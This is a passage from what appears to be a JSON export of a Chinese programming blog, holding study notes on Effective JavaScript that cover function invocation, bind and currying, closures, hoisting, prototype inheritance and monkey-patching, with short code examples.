lines.map(function(line)&#123; return line.split(self.regexp); // 显示获取self的的regexp属性 &#125;);&#125;var reader = new CSVReader();reader.read(\"a,b,c\\nd,e,f\\n\"); // [[\"a\",\"b\",\"c\"],[\"d\",\"e\",\"f\"]] 3.ES5中,可以使用回调函数的bind方法123456789CSVReader.prototype.read = function(str)&#123; var lines = str.trim().split(/\\n/); return lines.map(function(line)&#123; return line.split(this.regexp); // 此时的this表示外部传入的实例对象 &#125;.bind(this)); // 使用bind方法绑定外部的实例对象&#125;var reader = new CSVReader();reader.read(\"a,b,c\\nd,e,f\\n\"); // [[\"a\",\"b\",\"c\"],[\"d\",\"e\",\"f\"]] this变量的作用域总是由其最近的封闭函数所确定 使用一个局部变量(通常self,me)使得this绑定对于内部函数是可用的 38. 在子类的构造函数中调用父类的构造函数场景图是一个对象集合,包含了该场景图中的所有的对象(角色), 以及对底层图形的引用(context), 基于canvas123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function Scene(context, width, height, images)&#123; this.context = context; this.width = width; this.height = height; this.images = images; this.actors = [];&#125;Scene.prototype.register = function(actor)&#123; this.actors.push(actor);&#125;;Scene.prototype.unregister = function(actor)&#123; var i = this.actors.indexOf(actor); if(i &gt;= 0)&#123; this.actors.splice(i, 1); &#125;&#125;;Scene.prototype.draw = function()&#123; this.context.clearRect(0,0,this.width,this.height); for(var a = this.actors, i = 0, n = a.length; i &lt; n; ++i)&#123; a[i].draw(); &#125;&#125;;// 角色继承自基类Actor, 每个角色存储自身场景的引用以及坐标位置, 同时将自身添加到角色注册表中function Actor(scene, x, y)&#123; this.scene = scene; this.x = x; this.y = y; scene.register(this);&#125;// moveTo改变角色的坐标, 同时重绘场景Actor.prototype.moveTo = function(x,y)&#123; this.x = x; this.y = y; this.scene.draw();&#125;// 角色离开场景后需要从注册表中删除它并重绘场景Actor.prototype.exit = function()&#123; this.scene.unregister(this); this.scene.draw();&#125;// 每个actor有一个type字段, 用来查找它在图表中的图像Actor.prototype.draw = function()&#123; var image = this.scene.images[this.type]; this.scene.context.drawImage(image, this.x, this.y);&#125;Actor.prototype.width = function()&#123; return this.scene.images[this.type].width;&#125;Actor.prototype.height = function()&#123; return this.scene.images[this.type].height;&#125; 所有的特定角色都是Actor的子类, 例如太空飞船,SpaceShip类 先调用Actor的构造函数能保证通过Actor创建的所有实例属性都被添到新对象中, 然后再定义自身的实例属性,比如分数,point 最后为了使SpaceShip成为Actor的一个正确子类, 原型必须继承自Actor.prototype, 这种扩展最好使用使用Object.create方法123456789101112131415161718function SpaceShip(scene, x, y)&#123; Actor.call(this, scene, x, y); //子类构造函数必须显示调用父类Actor的构造函数, 同时将接收者绑定为自己 this.points = 0;&#125;SpaceShip.prototype = Object.create(Actor.prototype);// 创建了SpaceShip的原型对象后, 就可以添加被所有实例共享的属性和方法SpaceShip.prototype.type = 'spaceShip';SpaceShip.prototype.scorePoint = function()&#123; this.point++;&#125;;SpaceShip.prtotype.left = function()&#123; this.moveTo(Math.max(this.x - 10, 0), this.y);&#125;;SpaceShip.prototype.right = function()&#123; var maxWidth = this.scene.width - this.width(); this.moveTo(Math.min(this.x + 10, maxWidth), this.y);&#125; 若使用Actor的构造函数来创建SpaceShip的原型对象, 会有几个问题,没有任何合理的参数传递给Actor,1SpaceShip.prototype = new Actor(); 在子类构造函数中显示传入this作为显示的接收者调用父类的构造函数 使用Object.create函数来构造子类的原型对象以避免调用父类的构造函数 39. 不要重用父类的属性名为每一个Actor实例添加一个唯一的ID12345678function Actor(scene, x, y)&#123; this.scene = scene; this.x = x; this.y = y; this.id = ++Actor.nextID; scene.register(this);&#125;Actor.nextID = 0; 当使用此方法为Actor的子类也添加唯一ID时123456789function Alien(scene, x, y, direction, speed, strength)&#123; Actor.call(this, scene, x, y); this.direction = direction; this.speed = speed; this.strength = strength; this.damage = 0; this.id = ++Alien.nextID; // 与Actor中的id冲突&#125;Alien.nextID = 0; 由于两个类都给实例属性id写入数据, 所以会冲突. 属性存储在实例对象上是一个字符串, 若在继承体系中的两个类指向相同的属性名, 那么它们指向同一个属性. 解决的方法是两个类使用不同的属性名标识id123this.actorID = ++Actor.nextID;...this.alienID = ++Alien.nextID; 留意父类使用的所有属性名 不要在子类中重用父类的属性名 40. 避免继承标准类ES标准预定义了很多重要的类, 它们有很多特殊的行为, 所以很难写出行为正确的子类. 比如Array类1234567891011// 一个抽象的目录类, 继承数组的所有行为function Dir(path, entries)&#123; this.path = path; for(var i = 0, n = entries.length; i &lt; n; ++i)&#123; this[i] = entries[i]; &#125;&#125;Dir.prototype = Object.create(Array.prototype);var dir = new Dir(\"/tmp/mysite\", [\"index.html\",\"script.js\",\"style.css\"]);dir.length; // 0 , 不是预期的3, 破坏了数组的length属性的预期行为 失败的原因是length属性只对内部被标记为”真正的”数组的特殊对象起作用. 在ES5标准中,它是一个不可见的内部属性, 称为[[class]]. JS并不具备内部类系统, 不要被名字误导, [[class]]的值仅仅是一个简单的标签. 数组对象(通过Array构造函数或[]语法创建)被加上了值为”Array”的[[class]]属性, 函数被加上了值为”Function”的[[class]]属性, 以此类推… [[class]]属性对length的作用为: length的行为值被定义在内部属性为[[class]]的值为”Array”的特殊对象中, JS保持length属性与该对象的索引属性的数量同步. 但当扩展Array类时, 子类的实例并不是通过new Array()或字面量[]语法创建的, 所以, Dir的实例的[[class]]属性值为”Object”. 默认的Object.prototype.toString方法可以通过查询其接收者的内部[[class]]属性来创建对象的通用描述.123var dir = new Dir('/',[]);Object.prototype.toString.call(dir); // [object Object]Object.prototype.toString.call([]); // [object Array] 所以, 更好的实现方法是1234567891011function Dir(path, entries)&#123; this.path = path; this.entries = entries;&#125;// 在原型中重新定义Array的方法,将相应的方法委托给entries属性来完成Dir.prototype.forEach = function(f, thisArg)&#123; if(typeof thisArg === 'undefined')&#123; thisArg = this; &#125; this.entries.forEach(f, thisArg);&#125; ES标准库的大多数构造函数都有类型的问题, 某些属性或方法需要有正确的内部属性, 而子类却无法提供. 所以, 最好避免继承标准类: Array, Boolean, Date, Function, Number, RegExp, String. 继承标准类往往由于一些特殊的内部属性,如[[class]]而被破坏 使用属性委托优于继承标准类 41. 将原型视为实现细节一个对象给其使用者提供了简单,强大的操作集. 使用者与一个对象最基本的交互是获取属性值和调用其方法. 这些操作不在意属性存储在原型继承结构的那个位置上. 无论实现对象时将属性”加”在对象原型链的那个位置, 只要其值保持不变, 这些基本操作的行为也不会变. 简言之原型是一种对象行为的实现细节. JS提供的内省机制(introspection mechanisms)来检查对象的细节.Object.prototype.hasOwnProperty方法确实一个属性是否为自己的属性, 而不是继承而来的. Object.getPropertyOf和__proto__特性允许程序员便利对象的原型链并单独查询其原型对象. 对象是接口,原型是实现 避免检查无法控制的对象的原型结构 避免检查实现无法控制的对象内部属性 42. 避免使用猴子补丁由于对象共享原型, 因此每一个对象都可以增加,删除,修改原型的属性, 这种被称为猴子补丁(monkey-patching) 比如,若数组缺少一个方法,可以立即在数组的原型上添加它, 结果是每一个数组实例都可以使用这个方法了.123Array.prototype.split = function(i)&#123; return [this.slice(0, i), this.slice(i)];&#125; 但当多个库给同一个原型打补丁的时候, 问题就暴露了, 另一个库可能也给数组加了split方法,这样程序就有可能出错.1234Array.prototype.split = function()&#123; var i = Math.floor(this.length / 2); return [this.slice(0, i), this.slice(i)];&#125; 尽管猴子补丁很危险, 但是有一个很可靠的使用场景: polyfill, 一些新标准API可能在一些浏览器中并没有支持,但是许多程序或库却依赖这些方法. 这种时候, 由于这些API的行为是标准化的, 因此实现这些方法并不会造成库之间的不兼容. 检测Array.prototype.map是否存在, 以确保内置的实现不会被覆盖, 一般而言,内置的实现更高效, 测试更充分.123456789if(typeof Array.prototype.map !== \"function\")&#123; Array.prototype.map = function(f, thisArg)&#123; var result = []; for(var i = 0, n = this.length; i &lt; n; ++i)&#123; result[i] = f.call(thisArg, this[i], i); &#125; return result; &#125;;&#125; 避免使用轻率的猴子补丁 记录程序库所执行的所有猴子补丁 考虑通过将修改置于一个导出函数中, 使猴子补丁成为不可选的 使用猴子补丁为缺失的标准API提供polyfill","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"effective-javascript","slug":"effective-javascript","permalink":"https://github.com/xmoyKING/tags/effective-javascript/"},{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"}]},{"title":"effective-javascript笔记-3","slug":"effective-javascript3","date":"2017-02-27T11:42:53.000Z","updated":"2017-03-24T16:00:00.000Z","comments":true,"path":"2017/02/27/effective-javascript3/","link":"","permalink":"https://github.com/xmoyKING/2017/02/27/effective-javascript3/","excerpt":"","text":"使用函数18. 理解函数调用,方法调用及构造函数调用之间的不同在JS中,函数,方法,类的构造函数是单个构造对象的三种不用的使用模式.123456789101112131415161718192021222324252627// 函数调用function hello(name)&#123; return 'hello '+name;&#125;hello('tom'); // hello tom// 方法调用var obj = &#123; hello: function()&#123; return 'hello '+ this.name; &#125;, name: 'han'&#125;obj.hello(); // hello han// 此处hello通过this变量访问obj对象的属性// 在方法调用中,是由调用表达式自身来确定this变量的绑定,// 通过构造函数使用function User(name, pass)&#123; this.name = name; this.pass = pass;&#125;var u = new User('aa', 'psa');u.name; // aa// 构造函数调用将一个全新对象作为this变量的值,并隐式返回这个新对象作为调用结果// 构造函数的主要职责是初始化该新对象 1. 方法调用将被查找方法属性的对象作为调用接收者2. 函数调用将全局对象(处于严格模式下则为undefined)作为接收者,一般很少使用函数调用语法来调用方法3. 构造函数需要通过new运算符调用,并产生一个新的对象作为其接收者 19. 熟练掌握告诫函数高阶函数无非是那些将函数作为参数或者返回值的函数, 将函数作为参数(通常称为回调函数,因为高阶函数’随后调用’)1234567891011var names = ['fred', 'wilma', 'pebbles'];var upper = [];for( var i = 0, n = names.length; i &lt; n; ++i)&#123; upper[i] = names[i].toUpperCase();&#125;upper; // ['FRED', 'WILMA', 'PEBBLES']// 使用map方法,可以大大简化,var upper = names.map(function(name)&#123; return name.toUpperCase();&#125;); 创建高阶函数抽象有很多好处,但在编码中需要注意一些问题,比如正确获取循环边界条件, 在高阶函数的实现中，将一些常见的模式移到高阶的工具函数中是一个好习惯.1234567891011121314151617181920212223// 创建一个字符串,通过循环连接function buildStr(n, cb)&#123; var result = ''; for(var i = 0; i &lt; n; ++i)&#123; result += cb(i); &#125; return result;&#125;var alphabet = buildStr(26, function(i)&#123; return String.fromCharCode('a'.charCodeAt() + i);&#125;);alphabet; // 'abcdefghigklmnopqrstuvwxyz'var digits = buildStr(10, function(i)&#123; return i;&#125;);digits; // '0123456789'var random = buildStr(8, function(i)&#123; return String.fromCharCode('a'.charCodeAt() + Math.floor(Math.random() * 26));&#125;);random; // 随机值 20. 使用call方法自定义接收者来调用方法通常情况下, 函数或方法的接收者(即绑定到特殊关键字this的值) 是由调用者的语法决定的. 方法调用将方法的被查找对象绑定到this变量. 然而, 有时需要自定义接收者来调用函数, 因为该函数可能并不是期望的接收者对象的属性. 一种方式是, 将方法作为一个新的属性添加到接收者对象中，但这种方法是有问题的, 直接修改obj对象往往会出问题, 因为obj对象可能已经存在了一个temporary属性, 或者temporary属性是不可修改的， 或者对象可能被冻结(frozen)或密封(seal)以防止添加任何新属性.123obj.temporary = f; var result = obj.temporary(arg1, arg2, arg3);delete obj.temporary; 此时, 可以使用函数对象的call方法来自定义接收者. f.call(obj, arg1, arg2, arg3), 它的行为与f(arg1, arg2, arg3)类似.但, 不同的是, 第一个参数提供了一个显示的接收者对象. 当调用的方法已经被删除,修改或被覆盖时, call方法就派上用场了. 比如: hasOwnProperty方法可被任意的对象调用, 甚至该对象可以是一个字典对象.在字典对象中, 查找hasOwnProperty属性会得到盖子点对象的属性值, 而不是继承过来的方法.12dict.hasOwnProperty = 1;dict.hasOwnProperty('foo'); // error: 1 is not a function, 此时hasOwnProperty被覆盖为一个属性了, 而不是一个方法 call方法使调用字典对象中的方法成为可能,即使hasOwnProperty方法并没有在该对象中定义.12345var hasOwnProperty = &#123;&#125;.hasOwnProperty;dict.foo = 1;delete dict.hasOwnProperty;hasOwnProperty.call(dict, 'foo'); // truehasOwnProperty.call(dict, 'hasOwnProperty'); // false 当定义高阶函数时, call方法也很有用, 高阶函数的一个惯用法是接收一个可选的参数作为调用该函数的接收者. 例如, 表示键值对列表的对象12345678910111213141516171819// 允许table对象的使用者将一个方法作为table.forEach的回调函数f, 并可自定义接收者var table = &#123; entries: [], addEntry: function(key, value)&#123; this.entries.push(&#123;key: key, value: value&#125;); &#125;, forEach: function(f, thisArg)&#123; var entries = this.entries; for(var i = 0, n = entries.length; i &lt; n; ++i)&#123; var entry = entries[i]; f.call(thisArg, entry.key, entry.value, i); &#125; &#125;&#125;// 将一个table内容复制到另一个table中table1.forEach(table2.addEntry, table2);// 从table2中提取addEntry方法, forEach方法将table2作为接收者, 并反复调用该addEntry方法.// 虽然addEntry方法期望2个参数,但是forEach方法调用它时却传递了三个参数,键, 值, 索引.// 多余的参数是无害的, 因为addEntry方法会简单的忽略多余参数 1. 使用call方法可以调用在给定的对象中不存在的方法2. 使用call方法定义高阶函数允许使用者给回调函数指定接收者 21. 使用apply方法通过不同数量的参数调用函数可变参数版本比较简洁,优雅. 可变参数函数具有简单的参数列表, 至少让调用者预先明确的知道提供了多少个参数. 1. 使用apply方法指定一个可计算的参数数组来调用可变参数的函数2. 使用apply方法的第一个参数给可变参数的方法提供一个接收者 22. 使用arguments创建可变参数的函数可变参数提供灵活的接口, 不同的调用者可使用不同数量的参数来调用他们. 但提供一个可变参数的函数版本的同时也最好提供一个显示指定数组的固定元数的版本. 或者,使用一个函数封装版本, 内部用固定元数的函数来实现可变参数函数.123function average()&#123; return averageOfArray(arguments);&#125; 1. 考虑对可变参数的函数提供一个额外的固定元素的版本,从而无需借助apply方法 23. 永远不要修改arguments对象1. 使用[].shift.call(arguments)将arguments对象复制到一个真正的数组中在进行修改 24. 使用变量保存arguments的引用迭代器(iterator)是一个可以顺序存取数据集合的对象,典型的api是next函数,获取序列中的下一个值. 编写一个可以接收任意数量的参数,并使用迭代器获取值12345678910111213141516171819202122var it = values(1,4,1,4,2,1,3,5,6);it.next(); // 1it.next(); // 4it.next(); // 1function values()&#123; var i = 0, n = arguments.length; // var a = arguments; return &#123; hasNext: function()&#123; return i &lt; n; &#125;, next: function()&#123; if(i &gt;= n)&#123; throw new Error('end of iteration'); &#125;else&#123; // return a[i++]; return arguments[i++]; // wrong arguments,此时的arguments已经改变 &#125; &#125; &#125;&#125; 由于新的arguments变量被隐式的绑定到每一个函数内, 所以next函数有自己的arguments变量, 解决方案是使用一个变量a记住原来的arguments变量,在嵌套函数内使用变量a 1. 当引用arguments时需要注意嵌套层级2. 绑定一个明确作用域的引用到arguments,在嵌套函数内使用 25. 使用bind方法提取具有确定接收者的方法一个普通的函数与对象中值为函数的属性(方法)没有区别,所以可以将对象的方法提取出来作为高阶函数的回调函数. 能很方便的重用一些现有的方法达到预期目标,但此时需要注意被提取方法的接收者绑定到使用该函数的对象上,即this的值! 以下是一个字符串缓冲对象作为实例:123456789var buffer = &#123; entries: [], add: function(s)&#123; this.entries.push(s); &#125;, concat: function()&#123; this.entries.join(' '); &#125;&#125;; 将buffer对象的add方法提取出来,并作为其他数组对象的forEach方法的回调能省很多事儿12var source = ['567', '-', '1234'];source.forEach(buffer.add); // error: entries is undefined 此处报错是由于source中没有entries属性,也就是说,buffer的add方法的调用者不是buffer对象, 而是不知道的其他对象调用了add方法,所以没有找到entries属性, 此处的forEach方法的实现是使用全局对象作为默认的接收者的, 要想正确使用forEach方法, 可以提供第二个参数,将回调函数的接收者传入12source.forEach(buffer.add, source);buffer.join(); // '567-1234' 但并不是所有函数都提供了作为回调函数的接收者的参数, 此时,我们可以使用一个局部匿名函数, 在这个局部函数中显示调用回调函数,这种方法非常常见,而ES5的标准库中也直接支持使用这种方法.1234source.forEach(function(s)&#123; buffer.add(s);&#125;);buffer.join(); // '567-1234' 第二种解决的方法,那就是bind方法, 其实函数对象都有bind方法,该方法接受一个对象, 并产生一个新的函数,功能与原函数相同, 以传入的对象为调用者,调用这个新的函数1source.forEach(buffer.add.bind(buffer)); 也就是说,此时buffer.add.bind(buffer)创建了一个新的函数,而不是原来的buffer.add函数了, 同时它的接收者绑定到了buffer对象上,而原来的则不变.1buffer.add === buffer.add.bind(buffer); // false 这意味着bind方法是安全的, 即使是在程序的其他调用,也不会影响到原对象,这在调用原型对象上的公共方法时很有用 1. 提取一个方法不会将方法的接收者绑定到该方法的对象上2. 当给高阶函数传递对象方法时,使用匿名函数在适当的接收者上调用该方法3. 使用bind方法创建绑定到适当接收者的函数 26. 使用bind方法实现函数柯里化函数的bind方法除了能修改绑定的接收者之外,还有其他用途,比如:1234567891011function simpleURL(protocol, domain, path)&#123; return protocol + '://' + domain +'/path';&#125;// 一个paths数组中保存着相对路径, 使用这些相对路径构造绝对路径var urls = paths.map(function(path)&#123; return simpleURL('http', siteDomain, path);&#125;);// 可以用bind方法简化var urls = paths.map(simpleURL.bind(null,'http', siteDomain)); 使用 simpleURL.bind 产生一个委托到simpleURL的新函数. bind方法的第一个参数提供接收者的值. 由于simpleURL不需要引用this变量, 所以可以使用任何值, 使用null或undefined是惯用方法. simpleURL.bind的其余参数传递给simpleURL方法, 使用单个参数path调用simpleURL.bind, 则该执行结果是一个委托到simpleURL(&#39;http&#39;, siteDomain, path)的函数. 将函数与其参数的一个子集绑定的技术称为函数柯里化(currying), 以逻辑学家Haskell Curry的名字命名. 比起显示的封装函数, 函数柯里化是一种简洁的,使用更少引用来实现函数委托的方式. 1. 使用bind方法实现函数柯里化, 即创建一个固定需求参数子集的委托函数2. 传入null和undefined作为接收者的参数来实现函数柯里化, 从而忽略其接收者 27. 使用闭包而不是字符串来封装代码函数是一种将代码作为数据结构存储的便利方式, 这些代码可以随后被执行. 这使得高阶函数抽象如map, forEach成为可能,也是JS异步I/O方法的核心. 也可以将代码表示为字符串,传入eval函数达到相同的目的.12345function repeat(n, action)&#123; for(var i = 0; i &lt; n; ++i)&#123; eval(action); &#125;&#125; 该函数在全局作用域会工作正常,因为eval函数会将出现在字符串中的所有变量引用作为全局变量来解释.如:1234567891011121314151617181920// 测试函数执行速度的脚本, var start = [], end = [], timings = [];repeat(1000, 'start.push(Date.now()); f(); end.push(Date.now())');for(var i = 0, n = start.length; i &lt; n; ++i)&#123; timings[i] = end[i] - start[i];&#125;// 直接执行没问题,但是若移到函数中,则定义的start, end 不再是全局变量了function benchmark()&#123; var start = [], end = [], timings = []; repeat(1000, 'start.push(Date.now()); f(); end.push(Date.now())'); for(var i = 0, n = start.length; i &lt; n; ++i)&#123; timings[i] = end[i] - start[i]; &#125; return timings;&#125; 该函数会导致repeat函数引用全局的start和end变量. 会使程序行为变得不可预测,同时eval函数的另一个问题是优化. JS引擎很难优化字符串中的代码, 因为编译器不能早的获取源代码来即使优化代码. 然而函数表达式在其代码出现的同时就能被编译. 正确的方式是使用函数而不是字符串1234567891011121314151617181920function repeat(n, action)&#123; for(var i = 0; i &lt; n; ++i)&#123; action(); &#125;&#125;function benchmark()&#123; var start = [], end = [], timings = []; repeat(1000, function()&#123; start.push(Date.now()); f(); end.push(Date.now()); &#125;); for(var i = 0, n = start.length; i &lt; n; ++i)&#123; timings[i] = end[i] - start[i]; &#125; return timings;&#125; 1. 当将字符串传递给eval函数的时候, 绝不要在字符串中包含局部变量引用2. 接受函数调用的API优于使用eval函数执行字符串的API 28. 不要信赖函数对象的toString方法JS函数toString方法能将函数源代码作为字符串输出123(function(x)&#123; return x + 1;&#125;).toString(); // 'function(x)&#123;\\n return x + 1;\\n&#125;' 这种反射获取函数源代码的功能很强大, 但使用函数对象toString方法有严重的局限性. ES标准并没有对函数对象的toString方法的返回结果做规定, 也就是说不同的JS引擎可以有不同的结果. 同时,当使用了由宿主环境的内置库提供的函数后, 该方法也可能会失败123(function(x)&#123; return x + 1;&#125;).bind(16).toString(); // 'function(x)&#123; [native code] &#125;' 由于很多宿主环境下bind函数是有其他变成语言实现的(一般为C++), 宿主环境提供的是一个编译后的函数, 在此环境下函数没有JS的源代码用于显示. 同时,该方法生成的源代码并不展示闭包中保存的与内部变量引用相关的值.12345(function(x)&#123; return function(y)&#123; x + y; &#125;&#125;)(42).toString(); // 'function(y)&#123; return x + y; &#125;' 此处尽管函数是一个一个绑定x为42的闭包, 但结果字符串仍包含一个引用x的变量. 1. 函数对象的toString方法没有标准输出2. 函数对象的toString方法的执行结果不会暴露存储在闭包中的局部变量值3. 应该避免使用函数对象的toString方法 29. 避免使用非标准的栈检查属性许多JS环境都提供检查调用栈的功能, 调用栈是指当前正在执行的活动函数链. 在某些环境中,每个arguments对象都含有两个额外的属性: arguments.callee 和 arguments.caller, 前者指向使用该arguments对象被调用的函数. 后者指向调用该arguments对象的函数. arguments.callee除了允许匿名函数递归调用其自身外, 就没有更多的用途了.123var factorial = (function(n)&#123; return (n &lt;= 1) ? 1 : (n * arguments.callee(n-1));&#125;); arguments.caller属性, 它指向函数最近的调用者.123456789function revealCaller()&#123; return revealCaller.caller;&#125;function start()&#123; return revealCaller();&#125;start() === start; // true 使用该属性获取栈貌似很简单,很方便123456789101112131415161718function getCallStack()&#123; var stack = []; for(var f = getCallStack.caller; f; f= f.caller)&#123; stack.push(f); &#125; return stack;&#125;function f1()&#123; return getCallStack();&#125;function f2()&#123; return f1();&#125;var trace = f2();trace; // [f1, f2] 但getCallStack会有一个问题,那就是若某函数不止一次出现在调用栈中的时候, 会陷入死循环1234function f(n)&#123; return n === 0 ? getCallStack() : f(n-1);&#125;var trace = f(1); // infinite loop 问题出在由于函数f递归调用其自身, 因此其caller属性会自动更新,指回到函数f. 此时函数getCallStack会陷入查找函数f的死循环中. 虽然我们检测该循环,但是在函数f调用其自身之前也没有关于哪个函数调用了它的信息. 因为其他调用栈的信息已经丢失. 所以严格模式下, 获取arguments对像的caller / callee属性会出错.12345function f()&#123; ;\"use strict\"; return f.caller;&#125;f(); // error: caller may not be accessed on strict functions","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"effective-javascript","slug":"effective-javascript","permalink":"https://github.com/xmoyKING/tags/effective-javascript/"},{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"}]},{"title":"effective-javascript笔记-2","slug":"effective-javascript2","date":"2017-02-26T05:37:50.000Z","updated":"2017-12-06T14:50:08.946Z","comments":true,"path":"2017/02/26/effective-javascript2/","link":"","permalink":"https://github.com/xmoyKING/2017/02/26/effective-javascript2/","excerpt":"","text":"变量作用域8. 尽量少用全局对象由于全局命名空间是JS程序中独立组件进行交互的唯一途径,因此,利用全局命名空间的情况是不可避免的. JS的全局命名空间也被暴露为程序全局作用域中可以访问的全局对象,该对象作为this关键字的初始值.在浏览器中,全局对象被绑定到全局的window变量,添加或修改全局变量会自动更新全局对象.12345678this.foo; // undefinedfoo = 'global foo';this.foo; // 'global foo'// 或更新全局对象var foo = 'global foo';this.foo = 'changed';foo; // 'changed' 特性检测是一种使程序在平台特性集合的变化中依旧健壮的相对简单的方法,也可以使同一技术在浏览器和服务器环境下共享库.1234567// 检测 JSON (从ES5引入) 对象是否存在if(!this.JSON)&#123; this.JSON = &#123; parse: //... , stringify: //... &#125;;&#125; 1. 避免声明全局变量2. 避免对全局对象添加属性3. 使用全局对象来做平台特性检测 9. 始终声明局部变量意外的创建全局变量将是灾难. 1. 始终用var声明新的变量2. 考虑使用lint工具帮助检测未绑定的变量 10. 避免使用withwith语句可以很方便的避免对对象的重复引用, 但将使程序变得不可靠和低效. 1. 使用简短的变量名代替重复访问的对象2. 显示的绑定局部变量到对象属性上,而不是使用with语句隐式地绑定他们 11. 熟练掌握闭包理解闭包需要掌握三点: 1. JS允许引用在当前函数以外定义的变量12345678function makeSandwich()&#123; var magic = 'peanut butter'; function make(filling)&#123; return magic +' and ' + filling; &#125; return make('jelly');&#125;makeSandwich(); // 'peanut butter and jelly' make函数中引用了外部的magic变量 2. 即使外部函数已经返回,当前函数依然可以引用在外部函数所定义的变量12345678910function sandwichMaker()&#123; var magic = 'peanut butter'; function make(filling)&#123; return magic +' and ' + filling; &#125; return make;&#125;var f = sandwichMaker(); f('jelly'); // 'peanut butter and jelly'f('bananas'); // 'peanut butter and bananas' 与第一例子几乎一样,但是不是返回调用后的make函数,而是返回make函数本身,因此,f的值为内部的make函数,调用f实际上调用了make函数,但即使sandwichMaker已经返回,make函数仍然记着了magic的值。 闭包工作原理:JS的函数值在内部存储他们可能会引用的定义在其内封闭作用域的变量. 那些在其涵盖的作用域内跟踪变量的函数被称为闭包.make函数就是一个闭包,它引用了两个外部变量,magic和filling,每当make函数被调用,其代码都能引用到这两个变量,因为闭包存储了这些变量. 函数可以引用在其作用域内的任何变量,包括参数和外部变量:1234567891011121314function sandwichMaker(magic)&#123; function make(filling)&#123; return magic +' and ' + filling; &#125; return make;&#125;var f = sandwichMaker('ham'); f('jelly'); // 'ham and jelly'f('bananas'); // 'ham and bananas'var f = sandwichMaker('turkey'); f('cheess'); // 'turkey and cheess'f('bananas'); // 'turkey and bananas' 闭包是JS最有用的特性之一,也是许多库和惯用法的核心.JS还有一种更方便的构造闭包的方法，即函数表达式（字面量语法）.12345function sandwichMaker(magic)&#123; return function (filling)&#123; return magic +' and ' + filling; &#125;&#125; 该函数表达式是匿名的,由于只需一个make函数能产生新的函数值,而不打算在局部调用它,因此没有必要给该函数命名 3. 闭包可以更新外部变量的值实际上,闭包存储的是外部变量的引用,而不是值的copy.因此,对任何具有访问这些外部变量的闭包,都可以更新他们.12345678function box()&#123; var val = undefined; return &#123; set: function(newval)&#123; val = newval;&#125;, get: function()&#123;return val;&#125;, type: function()&#123;return typeof val;&#125; &#125;&#125; 1. 函数可以引用定义在其外部作用域的变量2. 闭包比创建他们的函数有更长的生命期3. 闭包在内部存储其外部变量的引用,并能读写这些变量 12. 理解变量声明提升JS支持词法作用域(lexical scoping),即对变量foo的引用将被绑定到声明foo变量最近的作用域中.123456789function isWinner(player, others)&#123; var higher = 0; for(var i = 0, n = others.length; i&lt; n; ++i)&#123; var player = others[i]; // 此处的var声明,将会使player变量被覆盖,每次都重写 if(player.score &gt; higher) highest = player.score; &#125; return player.score &gt; highest;&#125; 由于for循环内部声明的player局部变量,每次都会重写同一个变量, 所以return语句将player看作others的最后一个元素,而不是最初的player参数了. JS没有块级作用域的例外是异常处理, try...catch语句将捕捉的异常绑定到一个变量,而该变量的作用域只是catch语句块.123456789101112function test()&#123; var x = 'var', result = []; try &#123; throw 'exception'; &#125;catch(x)&#123; x = 'catch'; // 此行的x已经是在块级作用域下了，所以随着作用域结束而销毁了 console.log(x); // 'catch' &#125; result.push(x); return result;&#125;test(); // ['var'] 1. 在代码块中的变量声明会被隐式地提升到封闭函数的顶部2. 重声明变量被视为单个变量3. 考虑手动提升变量的声明,可以避免混淆 13. 使用立即调用的函数表达式创建局部作用域如下程序输出什么?1234567891011function wrapElements(a)&#123; var result = [], i , n; for(i = 0, n = a.length; i &lt; n; ++i)&#123; result[i] = function()&#123; return a[i] &#125;; &#125; return result;&#125;var wrapped = wrapElements([10,20,30,40]);var f = wrapped[0];f(); // ? 希望输出10, 但实际上它输出undefied, 搞清楚该例子是理解绑定和赋值的区别, 在运行时进入一个作用域, JS会为每一个绑定到该作用域的变量在内存内分配一个”槽”(slot) wrapElements函数绑定了三个局部变量: result, i, n, 因此, 当它被调用的时候,wrapElements函数会为这三个变量分配槽. 在每次迭代中循环体都会为嵌套函数分配一个闭包. 这个例子的坑在于: 期望该函数存储的是嵌套函数创建时变量i的值, 但实际存储的是变量i的引用. 由于每次函数创建后变量i的值都发生了变化, 因此,内部函数最终看到的变量i的值为4, 而a[4]值为undefined 所以需要注意, 闭包存储的是其外部变量的引用而不是值 解决的方法是创建一个嵌套函数并立即调用它来强制创建一个局部作用域.12345678910function wrapElements(a)&#123; var result = []; for(var i = 0, n = a.length; i &lt; n; ++i)&#123; (function()&#123; var j = i; //使用j这个局部变量保存每一次i的值 result[i] = function()&#123; return a[j] &#125;; &#125;)() &#125; return result;&#125; 另一种方法为变种,是将i作为IIFE的形参(局部变量)班定到IIFE,每次调用将其值作为实参传入123456789function wrapElements(a)&#123; var result = []; for(var i = 0, n = a.length; i &lt; n; ++i)&#123; (function(j)&#123; result[i] = function()&#123; return a[j] &#125;; &#125;)(i) &#125; return result;&#125; 但是这种IIFE的方式也存在一些弊端,如:代码块不能包含任何跳出块的break语句和continue语句, 代码块引用了this或arguments变量时,IIFE会改变它们 1. 理解绑定与赋值的区别2. 闭包通过引用而不是值捕捉外部变量3. 使用IIEF来创建局部变量4. IIFE中的代码块可能修改预期行为 14. 当心命名函数表达式的作用域1234567891011121314151617function double(x)&#123; return x * 2; &#125; // 命名函数声明var f = function double(x)&#123; return x * 2; &#125;; // 命名函数表达式var f = function(x)&#123; return x * 2; &#125;; // 匿名函数表达式// 匿名和命名函数表达式的区别在于: 命名函数表达式会绑定到与其函数名相同的变量上, // 这个变量可以作为函数内的一个局部变量,可以用来写递归函数表达式// 假设有tree是二叉树类型var f = function find(tree, key)&#123; if(!tree) return null; if(tree.key === key) return tree.value; return find(tree.left, key) || find(tree.right, key);&#125;;// 注意,find变量名仅仅只能用于其自身,不像函数声明,// 命名函数表达式不能通过其内部的函数名在外部调用find(mytree, 'foo'); // error: find is not defined// 然而事实上，chrome下能成功运行 使用命名函数表达式进行递归似乎没必要,因为外部作用域的函数名也可以达到同样的效果, 命名函数表达式真正的用处在于调试, 